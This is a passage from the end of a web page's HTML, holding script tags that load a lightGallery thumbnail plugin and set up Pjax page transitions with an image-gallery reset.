src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>